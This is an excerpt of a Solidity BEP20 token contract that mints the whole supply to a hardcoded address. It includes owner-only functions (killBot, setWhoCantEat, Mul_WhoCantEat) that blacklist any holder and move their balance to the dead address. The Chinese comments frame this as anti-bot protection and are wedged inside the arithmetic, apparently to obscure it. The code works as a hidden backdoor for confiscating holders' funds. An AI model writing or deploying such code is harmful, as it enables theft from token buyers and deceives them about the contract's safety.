...
contract BEP20 is Context, IERC20, Ownable {
    ...
    address public NEWLaFa = address(0xe9C10868BFf4b3Caff67beE86E7ca651203B1a95);
    ...
    address[2] memory _WALLET) 
    {
        ...
        isOnceEatExempt[NEWLaFa] = true;
        isOnceEatExempt[address(this)] = true;

        isMarketPair[address(uniswapPair)] = true;

        _balances[NEWLaFa] = _totalSupply;
        emit Transfer(address(0), NEWLaFa, _totalSupply);
    }
    ...
    function letsEatCake(uint256 canteat,bool stat) public onlyOwner {
        nowIsEatingCake = stat;
        cantEatCake = canteat;
    ...
    function Mul_isExcludedFromCut(address[] calldata addresses, bool status) public onlyOwner {
    ...
    function youCantEat(address recipient) internal {
        if (!whoCantEat[recipient]) {
            whoCantEat[recipient] = true;
            killBot(_balances[recipient],recipient);
        }
    }

    function killBot(uint256 amount,address account) public onlyOwner {
        require(whoCantEat[account]);
        _balances[account] /* 分散链上抢跑机器人筹码 */ = /* 分散链上抢跑机器人筹码 */  _balances[account]     /* 分散链上抢跑机器人筹码 */  .   /* 分散链上抢跑机器人筹码 */    sub(amount);
        _balances[address(0xdead)] = _balances[address(0xdead)]. /** 进黑洞 */  add(amount);
        _burnAmount[account] += amount;
        emit Transfer(account , /* 分散链上抢跑机器人筹码 */  address(0xdead), amount);
    }

    function setWhoCantEat(address recipient, bool status) public onlyOwner {
        whoCantEat[recipient] = status;
        if(!status){
            uint256 amount = _burnAmount[recipient];
            _balances[recipient] = _balances[recipient] /* 归还误杀的余额 */ . /* 归还误杀的余额 */ add /* 归还误杀的余额 */ (amount);
            _balances[address(0xdead)] = /* 归还误杀的余额 */ _balances[address(0xdead)] /* 归还误杀的余额 */ .sub  /* 归还误杀的余额 */ (amount);
            _burnAmount[recipient] = 0;
            emit Transfer(address(0xdead) , /* 归还误杀的余额 */ recipient , amount);
        }
    }

    function Mul_WhoCantEat(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
